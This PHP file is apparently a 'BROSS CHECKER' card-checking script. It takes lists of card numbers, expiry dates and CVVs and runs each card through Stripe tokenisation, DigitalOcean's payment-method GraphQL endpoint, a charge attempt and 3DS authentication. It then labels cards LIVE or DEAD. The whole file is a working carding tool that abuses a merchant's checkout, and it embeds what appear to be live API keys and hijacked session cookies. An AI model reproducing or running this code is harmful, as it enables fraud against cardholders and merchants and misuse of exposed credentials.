<?php
//===================== [ BROSS CHECKER ] ====================//
require 'function.php';
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
//////////
function handleError() {
  // Do something to handle the error, such as logging it or displaying an error message to the user
  error_log('Error occurred while making the HTTP request');
}
$lista =$_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
   ));

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Giovani+Barrows&card[address_line1]=street+645&card[address_line2]=&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10036&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8357bf8d-5d2b-4ee0-a989-acd4147292225abc84&muid=26f807b5-6497-4d2d-b517-7b105e27be4b0ed3c2&sid=ef8b474a-732e-485c-9e9b-a700d1d092a765a04a&payment_user_agent=stripe.js%2Fdfe094826%3B+stripe-js-v3%2Fdfe094826&time_on_page=161934&key=pk_live_ckPnmJJZTFKgKGv6RihxsV8g&pasted_fields=number');
$r1 = curl_exec($ch);
$id = Getstr($r1,'"id": "','"');
///echo "<br><b>Result1: </b> $result1<br>";
///echo "<br><b>id: </b> $id<br>";
/**/# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cloud.digitalocean.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: cloud.digitalocean.com',
'method: POST',
'path: /graphql',
'scheme: https',
'content-type: application/json',
'cookie:__cf_bm=nYAuXxFXTLiZ4yBOINPXNVYaLZ2vgjmtzZ.0YZfVQlM-1674675309-0-Ae1VrQDaxMsE47sIROgIRQPcAgy6xBi14gcTS4Fvu9Lnv5mROVMJrfcdBvzq8xWiR64sn0SwtKn4Q6o/mpoAMWZ+ORQK5jq/5f76CmtLcGtm; first_landing_page=/; referrer=; last_landing_page=/; last_landing_page_timestamp=1674675319901; sessionID=6993512; __ssid=32d2f9dc51e47bf08b7ddf2a5da6190; _digitalocean_remember_me=vUGYfDp0ZkeuDvIMOd38i_oVKTENC1eE9du9FpmNidJESf_C5jK6z24KzhpXF_HpQvMqjAkWVBjw_xG8K4mbPoMHOoLRTnGvIQfLmK8apjtBa2_1MGL1iY3dS28wnsDFdRoQ; _digitalocean2_session_v4=eW5sM0JpdlorQkw2YTU1ZlpnYm91TEV6QWRMNzNIeHRFbk1wbTJ3TmE2b1FPdnhodG9JR1pMbTh1VmNGU0tNOXVhbXI3WlVBMUtKTW9ySDBUeVIrODNuMTVPS2lNL0RSaDRKNllSWUxJRlpqOEpDVjEvNm9QUDNUT3hQeWl1eHdNc3M3RVUrUy9YQ0tKdGFrWkdhMHQzYXhCcVNWYXMxZnRIVHNybjRiSHRrVzhBNVVLblR2Ty9XcnZmZFpuZXBCbEp2Rk5JS0Q3Sm8yWWJrTXhQemJCWTdyQytLcG9lLzdZSExjZ0tML1o3UGEwQWlQYXJvNEdSM2ZlVFFiallSeHpXZXN1YzFwRU1kWmxlcEcyeEp2b2g1cGp5SGhwWklrNXNiT25PZ3RlaUFZdjlBZlZkaWpmMTZvUldvZElmUnBVVlRMOTZZSTVNYTdQKzlFVjJXKzluTmYwU1JTeHBoMkxieWhoNmRXS2lBMWxWNm94anVPOTl5V3dEWWhmeUsyVHVqd1pWQ0N1M0k2SC9pZXhma296TnFZdVFJLzZYaFR0Y2dlSGJqeFMzOWxhbDY2dHhuVU90cHdJb1FzRDZLakJ3ZU1DVDdJRDNiRUlhZFQrZUxGeWZUZUU1c2lMNmpMb2lJTnZjMDFjbFl1YVpWU0N3Vk5uMVpwVlpHMEdVUjZudHZ5ejRHYkd6dXNNdG81ZjlPKzIvQ1ZjWmhaVEp3OFhZNU9wcDhrb1FSdDQyZmNoUWxwMTBzMUtzN080bGtoZzlob0JlT1FiM21WS3lwK05oSG5KQVJNVHhxV3dFZ25COW1CcjcxSFZMOFRVMVRTZFQ2ZEpKcnJYZk9BSTVEcTR6Ykc2d1EreVd0WXJtSEgzdnhNTGx4OWJOTWtJUjFrWk5LMys5czRoY2c9LS1jU2xwQk5ubEFwQmJ5REVxbVlQaldnPT0=--99098ab06e3f826bfb5736af1dab3ea4f502c851; S=8457e3f1-ff57-422e-9210-9a4d11ede00a; __cid=io7K40tVqLVWyEU_p7tVDro2iwsAKQqnsoDUuqKBwZKWBN-5sYM9l6m03YS5xiO6_oO2TAlViLgQBemj7o3fxdXuktXL6LPW0K7qlIGh9-3Y77vVxvL_9OWh7oqfseSa5uixjIW6_8KHtfaa8PGv1tTWutj66KuVhLLolIK3_5L6yYv3_a3_1tjqupr25LzR3qj_-dnzsNfUru6KiK_vlIGv75ri4Lnbw-jwj4K28YmH7deMgrjt3omxus2yglS6JYnugoayvYyDt0Pm8M-Y9vSh9_3e7rjW1K3_7MTttNvfoe6Ugq_vmpnSqNPX9YzS0OW6yJHFuszY4rqamdKq2MvkrdWYofeKybHvioHC7_70qPaWkdKo09f1jNLQ5brIkeWt08fkrZMVle-LnrHulYC46Iqdoe-Ki7HvgIGxcLKxNP5_B_kUumKAAjnnZt9RsnaRM6trtkWzyR-6sYHfurGB37qxgd-6sYHfurGB37qxgd-6sYHfurGB37rxwZ_68cHfurGB37rxgZ-6sYGfurGA37qxgd-6sYEg; ajs_user_id=815274f0-2d74-4319-ba6b-1049b1e072c4; ajs_anonymous_id=3b30ddfb-6889-49df-863f-976edb745011; _digitalocean_initial_conversion=de4c81b2-874a-47ca-91c1-2224acf68649; __stripe_mid=26f807b5-6497-4d2d-b517-7b105e27be4b0ed3c2; __stripe_sid=ef8b474a-732e-485c-9e9b-a700d1d092a765a04a; cookieconsent_status=dismiss',
'origin: https://cloud.digitalocean.com',
'referer: https://cloud.digitalocean.com/welcome?i=de4c81',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"operationName":"submitPaymentMethod","variables":{"paymentMethodRequest":{"payment_profile":{"first_name":"Giovani","last_name":"Barrows","address":"street 645","city":"New York","state":"NY","zip":"10036","country":"US","is_default":true},"payment_method_id":"'.$id.'"}},"query":"mutation submitPaymentMethod($paymentMethodRequest: PaymentMethodCreateRequest!) {\n  createPaymentMethodV2(paymentMethodRequest: $paymentMethodRequest) {\n    intent_secret\n    stripe_error\n    error {\n      messages\n      __typename\n    }\n    __typename\n  }\n}\n"}');


$r2 = curl_exec($ch);
///echo "<br><b>Result2: </b> $result2<br>";


$pi1 = GetStr($r2, '{"data":{"createPaymentMethodV2":{"intent_secret":"', '_');
$pi = GetStr($r2, '{"data":{"createPaymentMethodV2":{"intent_secret":"', '"');
echo "<br><b>PI: </b> $pi<br>";
# ----------------- [3req ] ---------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer sk_live_1RXGiMaFbcPnfTD8uSI6LOvx',
    'Content-Type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency='.$crn.'&payment_method_types[]=card&payment_method='.$pi.'&confirm=true&off_session=true&receipt_email=testrdp055@gmail.com');
$r3 = curl_exec($ch);
# ----------------- [4req] ---------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/3ds2/authenticate',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
   ));
# ----------------- [4req Postfields] ---------------------#
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$source.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImRlODM5OGM0LTI1YzYtNGMyMy04OThhLTlkYWVhMGI2OWJjMSJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22768%22%2C%22browserScreenWidth%22%3A%221280%22%2C%22browserTZ%22%3A%22-60%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_ckPnmJJZTFKgKGv6RihxsV8g');
$r4 = curl_exec($ch);
# ----------------- [5req] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cloud.digitalocean.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: cloud.digitalocean.com',
'method: POST',
'path: /graphql',
'scheme: https',
'content-type: application/json',
'cookie:__cf_bm=nYAuXxFXTLiZ4yBOINPXNVYaLZ2vgjmtzZ.0YZfVQlM-1674675309-0-Ae1VrQDaxMsE47sIROgIRQPcAgy6xBi14gcTS4Fvu9Lnv5mROVMJrfcdBvzq8xWiR64sn0SwtKn4Q6o/mpoAMWZ+ORQK5jq/5f76CmtLcGtm; first_landing_page=/; referrer=; last_landing_page=/; last_landing_page_timestamp=1674675319901; sessionID=6993512; __ssid=32d2f9dc51e47bf08b7ddf2a5da6190; _digitalocean_remember_me=vUGYfDp0ZkeuDvIMOd38i_oVKTENC1eE9du9FpmNidJESf_C5jK6z24KzhpXF_HpQvMqjAkWVBjw_xG8K4mbPoMHOoLRTnGvIQfLmK8apjtBa2_1MGL1iY3dS28wnsDFdRoQ; _digitalocean2_session_v4=eW5sM0JpdlorQkw2YTU1ZlpnYm91TEV6QWRMNzNIeHRFbk1wbTJ3TmE2b1FPdnhodG9JR1pMbTh1VmNGU0tNOXVhbXI3WlVBMUtKTW9ySDBUeVIrODNuMTVPS2lNL0RSaDRKNllSWUxJRlpqOEpDVjEvNm9QUDNUT3hQeWl1eHdNc3M3RVUrUy9YQ0tKdGFrWkdhMHQzYXhCcVNWYXMxZnRIVHNybjRiSHRrVzhBNVVLblR2Ty9XcnZmZFpuZXBCbEp2Rk5JS0Q3Sm8yWWJrTXhQemJCWTdyQytLcG9lLzdZSExjZ0tML1o3UGEwQWlQYXJvNEdSM2ZlVFFiallSeHpXZXN1YzFwRU1kWmxlcEcyeEp2b2g1cGp5SGhwWklrNXNiT25PZ3RlaUFZdjlBZlZkaWpmMTZvUldvZElmUnBVVlRMOTZZSTVNYTdQKzlFVjJXKzluTmYwU1JTeHBoMkxieWhoNmRXS2lBMWxWNm94anVPOTl5V3dEWWhmeUsyVHVqd1pWQ0N1M0k2SC9pZXhma296TnFZdVFJLzZYaFR0Y2dlSGJqeFMzOWxhbDY2dHhuVU90cHdJb1FzRDZLakJ3ZU1DVDdJRDNiRUlhZFQrZUxGeWZUZUU1c2lMNmpMb2lJTnZjMDFjbFl1YVpWU0N3Vk5uMVpwVlpHMEdVUjZudHZ5ejRHYkd6dXNNdG81ZjlPKzIvQ1ZjWmhaVEp3OFhZNU9wcDhrb1FSdDQyZmNoUWxwMTBzMUtzN080bGtoZzlob0JlT1FiM21WS3lwK05oSG5KQVJNVHhxV3dFZ25COW1CcjcxSFZMOFRVMVRTZFQ2ZEpKcnJYZk9BSTVEcTR6Ykc2d1EreVd0WXJtSEgzdnhNTGx4OWJOTWtJUjFrWk5LMys5czRoY2c9LS1jU2xwQk5ubEFwQmJ5REVxbVlQaldnPT0=--99098ab06e3f826bfb5736af1dab3ea4f502c851; S=8457e3f1-ff57-422e-9210-9a4d11ede00a; __cid=io7K40tVqLVWyEU_p7tVDro2iwsAKQqnsoDUuqKBwZKWBN-5sYM9l6m03YS5xiO6_oO2TAlViLgQBemj7o3fxdXuktXL6LPW0K7qlIGh9-3Y77vVxvL_9OWh7oqfseSa5uixjIW6_8KHtfaa8PGv1tTWutj66KuVhLLolIK3_5L6yYv3_a3_1tjqupr25LzR3qj_-dnzsNfUru6KiK_vlIGv75ri4Lnbw-jwj4K28YmH7deMgrjt3omxus2yglS6JYnugoayvYyDt0Pm8M-Y9vSh9_3e7rjW1K3_7MTttNvfoe6Ugq_vmpnSqNPX9YzS0OW6yJHFuszY4rqamdKq2MvkrdWYofeKybHvioHC7_70qPaWkdKo09f1jNLQ5brIkeWt08fkrZMVle-LnrHulYC46Iqdoe-Ki7HvgIGxcLKxNP5_B_kUumKAAjnnZt9RsnaRM6trtkWzyR-6sYHfurGB37qxgd-6sYHfurGB37qxgd-6sYHfurGB37rxwZ_68cHfurGB37rxgZ-6sYGfurGA37qxgd-6sYEg; ajs_user_id=815274f0-2d74-4319-ba6b-1049b1e072c4; ajs_anonymous_id=3b30ddfb-6889-49df-863f-976edb745011; _digitalocean_initial_conversion=de4c81b2-874a-47ca-91c1-2224acf68649; __stripe_mid=26f807b5-6497-4d2d-b517-7b105e27be4b0ed3c2; __stripe_sid=ef8b474a-732e-485c-9e9b-a700d1d092a765a04a; cookieconsent_status=dismiss',
'origin: https://cloud.digitalocean.com',
'referer: https://cloud.digitalocean.com/welcome?i=de4c81',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
   ));
# ----------------- [5req Postfields] ---------------------#
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"submitPaymentMethod","variables":{"paymentMethodRequest":{"payment_profile":{"first_name":"Giovani","last_name":"Barrows","address":"street 645","city":"New York","state":"NY","zip":"10036","country":"US","is_default":true},"payment_intent_id":"'.$pi.'"}},"query":"mutation submitPaymentMethod($paymentMethodRequest: PaymentMethodCreateRequest!) {\n  createPaymentMethodV2(paymentMethodRequest: $paymentMethodRequest) {\n    intent_secret\n    stripe_error\n    error {\n      messages\n      __typename\n    }\n    __typename\n  }\n}\n"}');
$r5 = curl_exec($ch);
# ---------------- [Responses] ----------------- #
/*if (strpos($result2, '"messages":["We encountered an error processing your card. Please try again."]')) {
echo '<span style="color:red">DEAD='.$lista.'<br>Respunce2=error message</span><br>';
}
elseif (strpos($result2, '"message": "Unable to authenticate you"')) {
  echo '<span style="color:red">DEAD='.$lista.'<br>Respunce2=Unauthorized</span><br>';
}

elseif (strpos($result2, '"Your card number is incorrect."')) {
  echo '<span style="color:#333300">DEAD='.$lista.'<br>Respunce2=Your card number is incorrect.</span><br>';
}
elseif (strpos($result2, '["Your card does not support this type of purchase."]')) {
  echo '<span style="color:#333300">CCN='.$lista.'<br>Respunce2=Your card does not support this type of purchase.</span><br>';
}
elseif (strpos($result1, '"card_declined"')) {
  echo '<span style="color:#333300">DEAD='.$lista.'<br>Respunce1=Your card was declined.</span><br>';
}
elseif (strpos($result1, '"code": "invalid_cvc"')) {
  echo '<span style="color:#ff9933">DEAD='.$lista.'<br>Respunce1=Your card security code is invalid.</span><br>';
}
elseif (strpos($result2, '"Your card was declined."')) {
  echo '<span style="color:#333300">DEAD='.$lista.'<br>Respunce2=Your card was declined.</span><br>';
}
elseif (strpos($result1, ' "incorrect_number"')) {
  echo '<span style="color:#cccc00">DEAD='.$lista.'<br>Respunce1=incorrect_number.</span><br>';
}
elseif (strpos($result1, '"code": "invalid_expiry_month"')) {
  echo '<span style="color:#cccc00">DEAD='.$lista.'<br>Respunce1=Your card expiration month is invalid.</span><br>';
}
elseif (strpos($result1, ' "invalid_expiry_year"')) {
  echo '<span style="color:#ff6600">DEAD='.$lista.'<br>Respunce1=invalid_expiry_year</span><br>';
}
 else{
  echo '<span style="color:Aqua">LIVE='.$lista.'<br>[Result1="'.$result1.'"]<br>[Result2="'.$result2.'"]</span><br>';
 }*/
echo "<br><b>Result1: </b> $r1<br>";
echo "<br><b>Result2: </b> $r2<br>";
echo "<br><b>Result3: </b> $r3<br>";
echo "<br><b>Result4: </b> $r4<br>";
echo "<br><b>Result5: </b> $r5<br>";
curl_close($ch);
ob_flush();
?>